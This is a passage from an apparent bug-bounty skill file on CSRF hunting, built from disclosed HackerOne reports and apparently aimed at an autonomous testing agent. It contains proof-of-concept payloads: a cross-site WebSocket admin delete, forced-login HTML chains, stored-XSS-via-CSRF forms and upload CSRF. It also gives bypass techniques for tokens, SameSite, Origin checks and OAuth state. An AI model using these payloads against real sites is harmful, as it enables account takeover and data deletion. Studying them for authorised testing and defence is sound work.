var ws = new WebSocket("wss://target.com/hubs/admin");  // sends ambient cookie
ws.onopen = () => ws.send(JSON.stringify({type:1, method:'deleteUser', arguments:[42]}));
```

A 101 Switching Protocols response with the victim's cookie is the primitive (Stripo #915541; Duende SignalR carve-out below).

### Forced-Login / Logout-Chain PoC (#171398, #1124540, #229528)

```html
<html><body>
  <!-- Step 1: silently log the victim out of their own account -->
  <iframe src="https://target.com/logout" style="width:0;height:0;border:0"></iframe>
  <!-- Step 2: log them into an attacker-controlled account via a token/OTP link -->
  <script>
    setTimeout(function(){
      location.href = "https://target.com/auth/login?log-in.id=ID&log-in.key=KEY&log-in.token=TOKEN";
    }, 3000);
  </script>
  <!-- Step 3: victim enters payment/data into what they think is their account -->
</body></html>
```

The loss is the data the victim types into the attacker's session — confidential reports in the HackerOne SSO-SAML case (#171398) or payment details in the Liberapay case (#1124540). Without that downstream capture, forced login alone is informational.

### CRLF-in-Name Stored XSS via CSRF (#323005, #961787, #1237321)

```html
<form method='POST' enctype='application/json' action='https://api.target.com/3/folders'>
  <input name='name' value='New Test"><img src=x onerror=prompt(2)>'>
  <input name='is_private' value='false'>
</form>
<!-- CRLF in the field name spoofs the response content type to HTML:
     name="&#13;&#10;&lt;script&gt;alert(document.domain)&lt;/script&gt;"  (#1237321) -->
```

Pair with a token-less POST so the payload is stored on the victim's account and fires on a later page view — turning an out-of-scope self-XSS into a reportable attack.

### Multipart / Upload-Carrying CSRF (#868572, #401483, #1637761)

```html
<form method="POST" enctype="multipart/form-data" action="https://apps.target.com/wiki/users/editmyprofilepicture.action">
  <input type="file" name="attachment" />   <!-- browser attaches attacker-chosen file -->
  <input type="hidden" name="save" value="1" />
</form>
```

Topcoder's profile-photo upload (#868572) and Stripe's CSV import (#1637761) both had no token on the multipart endpoint — the simple `multipart/form-data` enctype sends without preflight.

### Payload Selection Heuristic

```
No token field in form / request .............. Basic form-POST PoC (first try)
Token present but omitted or static ........... Omission / cross-session reuse probes
Custom header present (X-CSRF, X-XSRF) ........ Check if server validates at all (#1049360)
JSON endpoint ................................. text/plain enctype JSON (#1049360)
GET state-changer ............................. <img src> or top-level navigation
Origin/Referer check .......................... raw client with spoofed header first
state/RelayState ............................... null byte, leak, predict, third-party trust
SameSite=Lax ................................... GET action or sibling subdomain
No observable state ............................ chain to XSS/SSRF/token leak, or N/A
```

---

## Common Root Causes

1. **Static CSRF tokens per session** — one token generated at login and reused for the whole session; leakable via XSS, Referer, cache, or analytics (HackerOne #834366, Liberapay #361131, Omise #919112).
2. **Token not tied to user identity** — server-wide or schedule-rotated, accepted across sessions/users (Django #26647, Liberapay #361130, Mail.ru #1086134).
3. **Token not validated at all** — present in forms/headers but ignored server-side; omitting or emptying it still succeeds (Streamlabs #1049360, HackerOne #148517, Veris #143321).
4. **Missing token on "secondary" endpoints** — login/signup protected, but API routes, import flows, webhooks, comment forms, and admin GET actions forgotten (#709537, #415238, #914232).
5. **JSON API assumption of safety** — `application/json` is safe via preflight *only if* `text/plain`/form-urlencoded are rejected; many apps accept them (#1049360, #140275, #323005).
6. **GET used for state changes** — deletes, pauses, token/link operations implemented as GET, defeating SameSite=Lax and needing no token (#2652190, #709537, #415238, #1477050, #1122408).
7. **OAuth `state`/`RelayState` not bound** — treated as a redirect hint; predictable, reusable, third-party-trusted, or leakable in JS/service-worker files (#170552, #127703, #1046630, #215381).
8. **Extension / path confusion skips middleware** — appending `.json`/`.xml`, trimming an extension, or path traversal makes the router match a different path for execution than for CSRF scope (#850022, #95555, #1497169, #301862).
9. **Framework / middleware misconfiguration** — CSRF middleware globally disabled or excluded for `/api/*` (Stripe #1483327, GitLab #1122408).
10. **SameSite=None for embeds** — set for cross-site iframes/integrations, silently re-enabling cross-site cookie send (#629892).
11. **Token leakage via cache/analytics/CSS/referer** — the defense exists but the token is disclosed (Shopify #1271944, #196458; Chaturbate #386334; Zaption #76733).
12. **Third-party software defaults** — Grafana, GoCD, Concrete5, AirOS shipped with weak/no CSRF in older versions and were never hardened (#240048, #59660, #289264).
13. **Client-accepted token values** — attacker-controlled token saved into the cookie and treated as legitimate (Veris #143321), or cookie/XSRF token values generated inside cookies (RelateIQ #2427).

---

## Bypass Techniques

### Defense: CSRF token present

- **Omit the field entirely** — some frameworks validate only if the field exists (#834366, #148517).
- **Send empty or malformed-but-shaped value** — format checked, not presence (#1046630).
- **Cross-session / cross-user substitution** — token not bound to the session (#361130, #1086134).
- **Static token reuse after logout** — token persists and is accepted on a new login (#361131, #919112, #2857).
- **Attacker-supplied token accepted** — set the token yourself in both cookie and field (#143321, #2427).
- **Path traversal around the check** — router executes the post-traversal path but applies CSRF scope to the pre-traversal path (GitHub Enterprise #1497169, HackerOne #301862).
- **Extension/format confusion** — `authorization.json`, `authorization.xml`, trimming `v1.json → v1` (#850022, #95555).

### Defense: SameSite=Lax

- Top-level navigation GET requests still carry the cookie — if the sensitive action is a GET (or a redirect converts POST→GET), Lax does not protect it (#709537, #2652190, #415238).
- Sibling subdomains under the same parent are "same-site" — a page on any `*.target.com` can POST with credentials and defeat Lax (Argo CD #2326194).
- Cookies scoped with `Domain=.target.com` let a taken-over or attacker-controlled sibling inject a session (Ubiquiti #172137).

### Defense: Origin / Referer header check

- **Null Origin** — sandboxed iframe (`<iframe sandbox="allow-scripts allow-forms">`).
- **Subdomain / weak matching** — if `*.target.com` is trusted, any sibling you control passes; `target.com.evil.com` passes naive string matching.
- **Referer regex flaw** — appending `{` or `}` to the domain passed validation (CS Money #975983).
- **Raw-client spoofing** — set `Origin`/`Referer` to the expected literal value from curl; many checks are plain string comparisons (#629892).
- **Referer stripping** — HTTPS→HTTP transitions drop the Referer header.

### Defense: Content-Type: application/json enforcement

- Use `text/plain` enctype with crafted input names that produce valid JSON — browser skips preflight (#1049360, #245346).
- Use `application/x-www-form-urlencoded` when the JSON parser is lenient (#323005).

### Defense: Double-submit cookie pattern

- If you can set cookies (subdomain takeover, cookie injection, CRLF), set both the cookie and form field to matching attacker values (#26647, #143321).

### Defense: custom header (X-Requested-With / X-CSRF)

- Simple requests can't set custom headers, but many servers check only header *presence* or accept requests without it. Streamlabs' `X-CSRF`/`X-XSRF` headers were present but not validated (#1049360).

### OAuth state bypasses

- **Null byte** in `state` defeats prefix/equality checks (#1046630).
- **Third-party trust** — a valid `state` from a third-party IdP doesn't protect you if that IdP has login CSRF/XSS/clickjacking (#170552).
- **State leakage** — read the state from a JS var, service worker, or JSON response and replay it in the callback (#127703).
- **Predictable/reused state** — brute-forceable or reused across attempts (#1727221).

### Duende BFF / SPA-framework carve-outs (2024–2026 surface)

Duende BFF (IdentityServer4 successor) requires only a **static `X-CSRF: 1` header** on BFF-mapped endpoints — identical for every caller, exists solely to force a CORS preflight. Collapses CSRF defense to "same-origin + session cookie present."

- **Cross-role replay** — one BFF serving `/admin/*` and `/user/*` cannot distinguish roles; any same-origin script landing `fetch('/bff/admin/users/delete?id=42',{credentials:'include',headers:{'X-CSRF':'1'}})` reaches admin endpoints if the victim holds the admin role.
- **SignalR/WebSocket carve-out** — browsers can't set custom headers on WS upgrades, so hubs are routinely excluded from antiforgery. A cross-origin `new WebSocket("wss://bff.example.com/hubs/admin")` with the ambient cookie invokes mutating hub methods (CSWSH).
- **Cookie-domain wildcarding** — `Domain=.example.com` drops `__Host-` protection; a taken-over sibling sets `.AspNetCore.Cookies=<attacker_session>` → session-fixation ATO.
- Evidence strength: these are design-level/documented behaviors, not a direct CVE. Lean on the chain's business impact. Adjacent CVEs: CVE-2025-26620, CVE-2024-51987, CVE-2024-39694.

**Duende hunting checklist:**
1. `curl https://target/bff/user -H 'X-CSRF: 1' -b '<session>'` — dumps the full claim set including internal IDs, role names, tenant IDs (info disclosure on its own).
2. Inspect `Set-Cookie` on the `/bff/login` callback — flag `Domain=` (vs `__Host-` prefix) and missing `Secure`/`HttpOnly`.
3. From a low-priv session, replay admin-partition POSTs with `X-CSRF: 1` to confirm no per-role token binding.
4. Enumerate SignalR/WS hubs (`/hubs/*`, `/signalr/*`) — open without `X-CSRF`; a 101 Switching Protocols means CSWSH is viable.
5. Subdomain inventory + DNS-takeover scan for any `*.example.com` if the BFF cookie has `Domain=.example.com`.

### Bypass Matrix

```
Defense                         →  Working bypass                                  → Evidence
Token in hidden field           →  omit / empty / substitute / static reuse        → #834366, #361130
Token validated by format only  →  well-formed fake value                          → #143321, #1046630
X-CSRF / X-XSRF header          →  remove it; server never validated               → #1049360
Origin/Referer string check     →  spoof value with raw client; null; subdomain    → #629892, #975983
SameSite=Lax                    →  GET state-changer or sibling-subdomain fetch    → #709537, #2326194
SameSite=None                   →  nothing needed; cross-site cookie already sent  → #629892
Double-submit cookie            →  cookie injection / subdomain takeover           → #26647, #143321
Content-Type enforcement        →  text/plain enctype JSON                         → #1049360
OAuth state                     →  null byte / leak in JS / predictable value      → #1046630, #127703
Middleware path scope           →  .json/.xml suffix, extension trim, traversal    → #850022, #1497169
Custom BFF header               →  static X-CSRF:1 replay across role partitions   → Duende surface
```

### CSRF→XSS / CSRF→SSRF chains

- Store an XSS payload via a token-less POST, then trigger it on page render (Imgur #323005, Rockstar #152013, AirOS #289264).
- Deliver reflected XSS by spoofing `enctype=text/plain` so the POST body reflects as HTML (Urban Dictionary #1237321, Acronis #961787).
- Drive an authenticated SSRF from a victim session (WordPress "Press This" #110801).

---

## Gate 0 Validation

Before writing the report, confirm all three:

1. **What can the attacker DO right now?**
   - The attacker must trigger a *specific* state-changing action on the victim's behalf with no interaction beyond a visited URL/page: account linking, email/password/security-question change, data deletion, payment action, or admin operation.
   - A missing/missing-validated token is not itself impact — show the forced request executed in the victim's account (response, resulting state, or a second-account observation).
   - For login/logout CSRF, show the concrete downstream loss (victim data captured in attacker session via forced login, as in HackerOne #171398).

2. **What does the victim LOSE?**
   - Name the concrete harm: account access (ATO), financial loss, data exposure/deletion, reputation damage, or infrastructure control.
   - "A CSRF token is missing" is not impact. "Attacker links their Google account to the victim's HackerOne profile, creating a second login path = ATO" is impact (#1727221). "Attacker changes the unconfirmed-email address, then resets the password = full account loss" is impact (#538800).

3. **Can it be reproduced in 10 minutes from scratch?**
   - Create attacker + victim accounts, host a static HTML PoC, have the victim visit, and confirm the action executed — all in ~10 minutes with no extra prerequisites.
   - For token-staticness bugs, confirm the token is reliably reusable (not a one-time fluke). For OAuth-state bugs, confirm the state is accepted on a fresh callback. For cache-deception token theft, confirm the cached response is reliably retrievable.
   - If reproduction requires luck, timing, or a specific server state, resolve the flakiness first.

### N/A Traps — retrain or retract

- **Logout CSRF** with no downstream consequence — no real loss.
- **Login CSRF** with no forced-session data capture — informational at best.
- **Read-only GET** that changes nothing — not a state change.
- **"Token missing" on an endpoint that requires step-up auth or an unguessable per-request nonce you can't obtain** — verify it actually executes.
- **Token present and correctly validated** — a token in the HTML that is enforced server-side is not a finding; confirm with an omission probe first.

### Evidence Checklist for the Report

- [ ] Raw HTTP request/response showing the state change with **only the victim's cookie** and no valid token.
- [ ] A negative control: the same request **with** a valid token (or from an unauthenticated session) for comparison.
- [ ] A second-account observation proving the change landed on the victim, not the attacker (#1727221, #127703).
- [ ] PoC HTML file hosted on a distinct origin (or raw-client header spoof for a string-check app), with auto-submit.
- [ ] Cookie posture screenshot: `Set-Cookie` flags (`SameSite`, `Domain`, `Secure`, `HttpOnly`).
- [ ] Token lifecycle evidence: two sessions / two users with compared token values where relevant (#361131, #361130).
- [ ] For OAuth-state bugs: the captured callback with the state value, plus proof it is accepted on a fresh victim session.
- [ ] For cache/analytics token leaks: the cached or reflected response containing the victim's token.
- [ ] A one-paragraph impact statement naming the concrete loss (ATO, money, data, admin control) — not "a request executed".
- [ ] Repro steps a triager can follow in 10 minutes with two fresh accounts.

---

## Real Impact Examples

### Scenario A — Unconfirmed-Email Change → Password-Reset ATO (Khan Academy #419891 / #538800)

The `/signup/email` API let an authenticated user change the email on an *unconfirmed* account, and it did not verify intent via headers or token. The attacker lured a new user to a page that POSTed `casing=camel&email=ATTACKER_EMAIL`. The email change went through, the attacker then used password reset on the now-attacker-controlled address, and the original user could not reclaim the account because their email was no longer associated. Rated Critical for ATO.

### Scenario B — Null-Byte OAuth State → One-Click ATO (Logitech/Streamlabs #1046630)

The researcher initiated a Twitch account merge on their own account, dropped the callback to avoid consuming the single-use `code`, appended a null byte (`%00`) to the `state` parameter, and hosted the resulting CSRF PoC. When a victim visited, the flawed state comparison accepted the attacker-issued callback, linking the attacker's Twitch identity to the victim's Streamlabs account — a one-click ATO. It was a bypass of an earlier fix (#1039749), illustrating the regression-mining pattern.

### Scenario C — GET OAuth Connect → Full ATO (Discourse #423022)

The "Connect Yahoo account" workflow used the GET method with no CSRF protection. An attacker induced a victim to connect the *attacker's* Yahoo account to the victim's Discourse account. Because the connected social identity became a login path, this escalated to full account takeover — a plain link was enough. The same GET-link pattern appears in Bumble's `rt`-leak ATO (#127703) and Periscope's Web OAuth authorize endpoint (#215381).

### Scenario D — CSRF as an XSS Delivery Vehicle (Imgur #323005)

Self-XSS and CSRF were each out of scope, but combined they produced a real attack. A favorites folder whose name contained `'"><img src=x onerror=prompt(1)>` stored the payload; a CSRF POST to `api.imgur.com/3/folders` with `enctype=application/json` created that folder on the victim's account, and the payload fired when the victim saved an image to it. This "self-XSS + CSRF = stored attack on victim" chain recurs across the corpus (#152013, #289264).

### Scenario E — SameSite=Lax Sibling-Subdomain → Kubernetes Cluster Compromise (Argo CD #2326194)

Argo CD did not enforce `Content-Type: application/json`, and SameSite=Lax is ineffective when the attacker controls any sibling subdomain of the shared parent. A page on `marketing.<parent>` used `fetch(..., {method:'POST', credentials:'include', body:'<malicious manifest>'})` against the Argo CD API, creating an application pointing at an attacker-controlled Git repo. The resulting compromise reached the Kubernetes cluster — reported to Internet Bug Bounty for $4,660 (CVE-2024-22424).

### Scenario F — Path-Traversal CSRF Token Bypass → Admin Action (GitHub Enterprise #1497169, $10,000)

The router matched the post-traversal path for execution but the pre-traversal path for CSRF-protection scope. A form POST to `/setup/api/start/..%2f..%2fadmin%2fusers` reached the protected admin endpoint without a valid token, allowing attacker-controlled user creation on GitHub Enterprise Server (CVE-2022-23732). A related path-confusion variant hit HackerOne's invite/password-reset routes (#301862).

### Scenario G — Framework-Wide Middleware Failure (Stripe Dashboard #1483327, $5,000)

A 2022-02-14 deploy inadvertently disabled CSRF middleware across all Stripe Dashboard endpoints. A `text/plain` form POST to `/account/settings` with a JSON-shaped name/value pair was parsed as a valid JSON body and applied to the authenticated account, with no token check anywhere in the path. Two independent researchers reported the same global misconfiguration and shared the $5,000 award. The lesson: when a whole framework's protection is switched off, the simplest possible form PoC is the right one — do not over-engineer the payload.

### Scenario H — Web Cache Deception → Token Theft → CSRF (Shopify #1271944, $800)

The researcher appended path-confusion segments and a random `.css` filename to an authenticated Shopify page. The caching proxy stored the response — including the victim's personal data and CSRF token — under the static-looking URL. The attacker then fetched the same URL without credentials and read the victim's token, which could be used to submit authenticated requests on their behalf. The sibling case on `apps.shopify.com` leaked the same `authenticity_token` through the victim's Google Analytics dashboard (#196458). Here the CSRF defense was intact; the bug was that the token was disclosed.

---

## Disclosed Report Citations

All IDs below are real reports present in the study pack or the TOP CSRF list. Format: **Company — title** ([H1 #id](https://hackerone.com/reports/id)) — subclass, technique, year/bounty.

1. **Shopify — CSRF on connecting Paypal as Payment Provider** ([H1 #807924](https://hackerone.com/reports/807924)) — payment-provider OAuth link CSRF; long-lived fixed `merchantId` as weak mitigation; 2020, no bounty.
2. **HackerOne — Slack integration setup lacks CSRF protection** ([H1 #170552](https://hackerone.com/reports/170552)) — OAuth integration CSRF via third-party `state` trust; 2016, **$2,500** (CVSS 8.2).
3. **GitLab — CSRF on /api/graphql allows executing mutations through GET requests** ([H1 #1122408](https://hackerone.com/reports/1122408)) — GET-converted GraphQL mutations; `?query=mutation{...}` skips `X-CSRF-Token`; 2021, **$3,370**.
4. **GitHub — CSRF protection bypass in GitHub Enterprise management console** ([H1 #1497169](https://hackerone.com/reports/1497169)) — path-traversal token-bypass (CVE-2022-23732); 2022, **$10,000**.
5. **Stripe — CSRF token validation system is disabled on Stripe Dashboard** ([H1 #1483327](https://hackerone.com/reports/1483327)) — framework-wide CSRF middleware disabled + `text/plain` JSON; 2022, **$5,000** (two researchers).
6. **Internet Bug Bounty — Argo CD CSRF leads to Kubernetes cluster compromise** ([H1 #2326194](https://hackerone.com/reports/2326194)) — SameSite=Lax sibling-subdomain bypass + missing Content-Type enforcement (CVE-2024-22424); 2024, **$4,660**.
7. **HackerOne — Login CSRF vulnerability on hackerone.com** ([H1 #834366](https://hackerone.com/reports/834366)) — `authenticity_token` not verified on login; 2020, **$500**.
8. **Logitech — One Click Account takeover using OAuth CSRF bypass by adding Null byte %00 in state parameter** ([H1 #1046630](https://hackerone.com/reports/1046630)) — null-byte `state` bypass; 2020, **$200**.
9. **Discourse — Account takeover due to no CSRF protection in connecting Yahoo account** ([H1 #423022](https://hackerone.com/reports/423022)) — GET-method OAuth connect → ATO; 2018, **$512**.
10. **Khan Academy — CSRF vulnerability on API endpoint allows account takeovers** ([H1 #419891](https://hackerone.com/reports/419891)) — `/signup/email` unconfirmed-email ATO; 2018, no bounty.
11. **Khan Academy — Account takeover by changing email** ([H1 #538800](https://hackerone.com/reports/538800)) — `/signup/email` email change → password-reset ATO; 2019, no bounty.
12. **Bumble — [CRITICAL] Full account takeover using CSRF** ([H1 #127703](https://hackerone.com/reports/127703)) — social-account link via `rt` state leaked in service-worker JS; 2016, no bounty.
13. **X / xAI — Periscope android app deeplink leads to CSRF in follow action** ([H1 #583987](https://hackerone.com/reports/583987)) — mobile deeplink CSRF via exported scheme; 2019, **$1,540**.
14. **X / xAI — Periscope iOS app CSRF in follow action due to deeplink** ([H1 #805073](https://hackerone.com/reports/805073)) — mobile deeplink CSRF / QR delivery; 2020, **$2,940**.
15. **Imgur — CSRF leads to a stored self xss** ([H1 #323005](https://hackerone.com/reports/323005)) — CSRF → stored self-XSS chain; 2018, no bounty.
16. **Urban Dictionary — CSRF to Reflected XSS at echo.urbandictionary.biz via spoofing content type** ([H1 #1237321](https://hackerone.com/reports/1237321)) — `enctype=text/plain` reflects POST body as HTML; 2021, no bounty.
17. **U.S. Dept Of Defense — CSRF Attack on changing security questions leads to full Account TakeOver** ([H1 #2652603](https://hackerone.com/reports/2652603)) — security-question change → password-reset ATO; 2024, no bounty (CVSS 8.8).
18. **U.S. Dept Of Defense — CSRF leads to Account takeover** ([H1 #2699029](https://hackerone.com/reports/2699029)) — profile email/password edit ATO; 2024, no bounty.
19. **U.S. Dept Of Defense — CSRF leads to Account takeover** ([H1 #2712857](https://hackerone.com/reports/2712857)) — profile edit escalation to ATO; 2024, no bounty.
20. **Shopify — Web Cache Deception vulnerability leads to personal information and CSRF tokens leakage** ([H1 #1271944](https://hackerone.com/reports/1271944)) — path-confusion cache → token theft; 2021, **$800**.
21. **Shopify — apps.shopify.com CSRF token leakage through Google Analytics** ([H1 #196458](https://hackerone.com/reports/196458)) — `?authenticity_token=` reflected into analytics; 2017, no bounty.
22. **Chaturbate — CSS Injection on /embed/ via bgcolor parameter leaks user's CSRF token and allows for XSS** ([H1 #386334](https://hackerone.com/reports/386334)) — CSS-injection token enumeration → XSS; 2018, no bounty.
23. **HackerOne — (HackerOne SSO-SAML) Login CSRF, Open Redirect, and Self-XSS Possible Exploitation** ([H1 #171398](https://hackerone.com/reports/171398)) — login CSRF + forced-login data capture; 2016, no bounty.
24. **GitLab — [Admin Panel] CSRF to resume/pause runner** ([H1 #415238](https://hackerone.com/reports/415238)) — GET admin action with no token; 2018, no bounty.
25. **Evernote — CSRF leads to account deactivation of users** ([H1 #1121990](https://hackerone.com/reports/1121990)) — account deactivation POST; 2021, **$300**.
26. **Acronis — Delete any user's added Email, Telephone, Fax, Address, Skype via CSRF** ([H1 #709537](https://hackerone.com/reports/709537)) — GET contact deletion with no token; 2019, no bounty.
27. **Logitech — CSRF in changing users donation_settings** ([H1 #1049360](https://hackerone.com/reports/1049360)) — JSON CSRF; unvalidated `X-CSRF`/`X-XSRF` headers; 2020, no bounty.
28. **Insightly — CSRF vulnerability allows disabling Gmail contacts link for user referrals** ([H1 #1668489](https://hackerone.com/reports/1668489)) — connected-account disable/email change CSRF; 2022, no bounty.
29. **Basecamp — CSRF on launchpad.37signals.com OAuth2 authorization endpoint** ([H1 #850022](https://hackerone.com/reports/850022)) — `.json`/`.xml` extension skips authenticity token; 2020 (CVSS 8.1), no bounty.
30. **Superhuman (formerly Grammarly) — Lack of CSRF header validation at g-mail.grammarly.com/profile** ([H1 #629892](https://hackerone.com/reports/629892)) — CORS/Origin trust of `http://` and any subdomain + untransferred token; 2019, no bounty.

---

## Related Skills & Chains

- **`hunt-xss`** — Any XSS on a trusted origin neutralizes CSRF defenses (token, SameSite, Origin check) instantly. Chain primitive: XSS reads `meta[name=csrf-token]`, then same-origin-fetches `/accounts/email` with an attacker payload → one-click ATO. Conversely, CSRF is the delivery vehicle for stored/reflected self-XSS (Imgur #323005, Urban Dictionary #1237321).
- **`hunt-oauth`** — OAuth/SAML `state`/`RelayState` is structurally a CSRF token; missing validation here *is* account-linking CSRF. Chain primitive: attacker starts OAuth on their account, sends the victim `/callback?code=X&state=`, victim's logged-in browser completes the link (#170552, #1046630, #127703).
- **`hunt-auth-bypass`** — CSRF on a password/security-question reset or an endpoint that skips step-up auth → ATO without the victim's current credentials (#2652603, #742). Subdomain-takeover + parent-domain cookie is a session-fixation auth bypass on the same surface (#172137).
- **`hunt-ssrf`** — CSRF can trigger an authenticated server-side fetch from a victim session (WordPress "Press This" #110801). Chain primitive: CSRF → victim's browser requests an SSRF sink with their cookie.
- **`hunt-clickjacking`** — Clickjacking + login/logout CSRF captures victim data inside an attacker session (#171398, #214087).
- **`hunt-subdomain-takeover`** — A takeover of any sibling under a `Domain=.parent` cookie enables session injection and defeats SameSite=Lax (Argo CD #2326194, Ubiquiti #172137).
- **`security-arsenal`** — Reach for the CSRF PoC templates (form POST, `text/plain` JSON, sandboxed-iframe null origin, base64/multipart bypass) and the WAF-bypass header variants for Origin/Referer checks before writing one from scratch.
- **`triage-validation`** — Run the Pre-Severity Gate before submitting CSRF on a logout endpoint, a read-only GET, or any action without a state-change consequence — those are the canonical N/A traps. Confirm the victim LOSES something concrete (account access, money, data), not just "a request executed."


---

## Merged Source Knowledge

This section consolidates **29 unique knowledge blocks** from 1 curated source skills in `hunt-skills/`, `normal-skills/`, and `offensive-skills/`. Blocks overlapping the report-mined sections above were dropped; the complete, globally deduplicated source corpus is archived at `references/source-knowledge.md` (38 unique sections). No source section appears in more than one hunt skill.


### From `hunt-skills/hunt-csrf/SKILL.md`

## Shortcut: a raw HTTP client beats a real cross-origin page for header-check CSRF

A raw HTTP client (curl, Burp Repeater, any scripting client) is not a browser: it will send
whatever `Origin`/`Referer` header VALUE you set, from any path, on the same connection as your
authenticated cookie. Many apps that claim to defend against CSRF only do a naive **string check**
on the incoming `Origin`/`Referer` header (does it contain/equal some expected value?) rather than
real same-origin enforcement — you can satisfy that check directly by setting the header, with no
actual cross-site delivery (hosting an HTML page, a headless browser) required. This is faster and
more reliable than building a real attacker page for this exact pattern:
```
POST /profile HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Origin: https://a-domain-the-app-treats-as-trusted-or-attacker-controlled.example
Cookie: <authenticated session>

username=csrf_poc
```
If some text names a SPECIFIC origin/domain as the "expected" attacker page, that literal value is
often exactly what the server's check is looking for — try it verbatim in `Origin` (fall back to
`Referer` if `Origin` alone doesn't flip it). Only build a real cross-origin page (actual browser
delivery) when the target does genuine SameSite/fetch-based origin enforcement that a spoofed header
can't satisfy.

## Autonomous Testing Priority

**CSRF only matters on state-changing actions that a browser could be tricked into making cross-site.**

**Testing flow:**
1. **GET the form endpoint** to establish a baseline and check what fields exist (look for hidden `csrf_token`, `authenticity_token`, `_token`, `csrfmiddlewaretoken` fields).
2. **POST the state-changing action without any CSRF token field.** Send only the functional parameters (email, amount, etc.).
3. **Use a "simple-request" Content-Type** — `application/x-www-form-urlencoded`, `multipart/form-data`, OR `text/plain` are the three CORS "simple" content-types a cross-origin form can send with no preflight. A JSON endpoint is CSRF-resistant **only if the server rejects those** — if it also accepts a `text/plain` body (common), craft a `text/plain` payload that parses as valid JSON (see the JSON-CSRF-via-text/plain section). Don't skip a JSON endpoint on the assumption that `application/json` alone is protective.
4. **If the action succeeds (2xx, no "invalid token" error) → CSRF is confirmed.**

**High-value targets (in order of impact):**
- Email/password change → account takeover
- Money transfer or payment → financial fraud
- Admin actions (role assignment, user deletion)
- OAuth social-account linking → persistent ATO

**Token bypass techniques when a token IS present:**
- Omit the token field entirely — some frameworks only validate if the field exists, not if it's absent
- Send an empty value (`_token=`) — some validate format, not presence
- Copy a token from another session — some tokens aren't tied to the session

**Scope:** Don't test CSRF on login forms (no existing session to exploit), logout (no real impact), or read-only GET endpoints.

---

## Crown Jewel Targets

CSRF becomes high-value when it touches **state-changing actions with account-level or financial consequences**. The highest-paying targets are:

- **Account takeover vectors**: OAuth/SSO flows (RelayState manipulation), social account linking/unlinking (Oculus-Facebook, SocialClub), import-friends features that expose OAuth tokens
- **Authentication infrastructure**: Login CSRF, session fixation via CSRF, forced account association
- **API endpoints accepting cross-origin POST**: JSON APIs, heartbeat/activity APIs, anything that skips Content-Type enforcement
- **Third-party integrations**: Grafana, monitoring dashboards, embedded analytics — often lag on CSRF protections
- **Social platforms**: Twitter/X collections, friend imports, social graph mutations — high-volume, authenticated actions with real user impact

**Asset types that pay most:** Core product auth flows > API gateways > third-party integrations running on subdomains > admin panels.

---

### URL Patterns
```
/oauth/authorize?RelayState=
/accounts/link
/import/friends
/api/v*/heartbeat
/api/v*/collect
/monitoring/* (Grafana, Prow, Prometheus)
/auth/saml/callback
/connect/* (social integrations)
```

# Missing or weak SameSite cookie attributes
Set-Cookie: session=abc123; HttpOnly        # no SameSite = vulnerable
Set-Cookie: session=abc123; SameSite=None   # explicitly allows cross-site

# No X-Frame-Options or permissive CORS
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true      # dangerous combo
```

### JS / DOM Patterns
```javascript
// Static or predictable CSRF tokens
meta[name="csrf-token"]   // grep if value changes across sessions
authenticity_token        // Rails — check if reused across page loads

// JSON endpoints without Content-Type enforcement
fetch('/api/heartbeat', {method: 'POST', body: JSON.stringify(data)})

// No CSRF token in form at all
<form method="POST" action="/accounts/link">  // no hidden token field
```

### Tech Stack Signals
- **Rails apps**: Look for `authenticity_token` — test if it's static per session
- **Django apps**: Check `csrfmiddlewaretoken` — test cross-user/session reuse
- **Grafana instances**: CVE-2022-21703 — check version via `/api/health`
- **SAMLv2/OIDC flows**: `RelayState` parameter rarely validated
- **Express/Node APIs**: Often skip CSRF middleware on `/api/*` routes

---

## Step-by-Step Hunting Methodology

1. **Map all state-changing endpoints** — Spider authenticated session, filter for POST/PUT/DELETE/PATCH. Note every form and AJAX call.

2. **Check cookie SameSite attributes** — In DevTools → Application → Cookies. Flag any session cookie without `SameSite=Strict` or `Lax`.

3. **Test token staticness** — Log in twice (different sessions or incognito). Compare `authenticity_token` / `csrfmiddlewaretoken` / `csrf-token` values across:
   - Same session, different page loads (should be different)
   - Different sessions for same user
   - Different users entirely

4. **Test token omission** — Remove the CSRF token field entirely from a POST request. If the server returns 200, you have CSRF.

5. **Test token substitution** — Replace the token with one from a different session. Server accepting it = broken validation.

6. **Test JSON endpoints for form-POST CSRF** — Check if Content-Type is enforced:
   - Send `application/x-www-form-urlencoded` to a JSON endpoint
   - Send `text/plain` with a JSON body
   - If accepted, HTML form can trigger it cross-origin

7. **Hunt OAuth/SSO RelayState** — Intercept SAML/OIDC flows. Test if `RelayState` is validated for same-origin. Inject external URLs.

8. **Check social linking flows** — Every "connect your X account" feature. These often use redirect-based OAuth where CSRF on the callback can associate an attacker's social account.

9. **Test third-party dashboards on subdomains** — Grafana, Kibana, Prometheus. Check version, apply known CVEs, test default CSRF posture.

10. **Build PoC HTML page** — Host on a different origin, fire the request, confirm cookies are sent and action executes.

---

### Grafana CVE-2022-21703 version check
```bash
curl -s https://monitoring.target.com/api/health | jq '.version'

## Common Root Causes

1. **Static CSRF tokens per session** — Developers generate one token at login and reuse it. Airbnb bug: `authenticity_token` was the same across all page loads for a session, making it trivially leakable.

2. **Token not tied to user identity** — Token is valid server-wide or rotates on a schedule, not per-user/session. Mozilla bug: `csrftoken` reusable across users.

3. **Missing token on "secondary" endpoints** — Developers protect login/signup but forget API endpoints, import flows, or webhook handlers.

4. **JSON API assumption of safety** — Belief that `Content-Type: application/json` prevents CSRF. It does via CORS preflight — unless the server also accepts `text/plain` or `application/x-www-form-urlencoded`.

5. **SameSite=None for cross-site embeds** — Developers set `SameSite=None` to support iframe embeds or third-party integrations, inadvertently re-enabling CSRF.

6. **OAuth RelayState not validated** — Developers implement SAML/OIDC but treat `RelayState` as a redirect hint, not a CSRF state parameter requiring cryptographic binding.

7. **Framework misconfiguration** — CSRF middleware excluded for `/api/*` routes in Django/Rails because "API clients don't need it," but browser-based JS clients do.

8. **Third-party software defaults** — Grafana, Kibana, Jenkins shipped with weak or no CSRF protection in older versions; teams don't patch or check.

---

### Defense: SameSite=Lax cookies
**Bypass:** Top-level navigation GET requests still work. If the sensitive action can be triggered via GET (or if a redirect chain converts POST→GET), Lax doesn't protect it. Also: subdomains can still set cookies for parent domain.

### Defense: CSRF token present
**Bypasses:**
- Token is static per session — steal via XSS, Referer leakage, or cached page
- Token not validated server-side — just remove it and try
- Token validated by length/format only — submit a fake but correctly-formatted value
- Token tied to session but session is predictable

### Defense: `Content-Type: application/json` enforcement
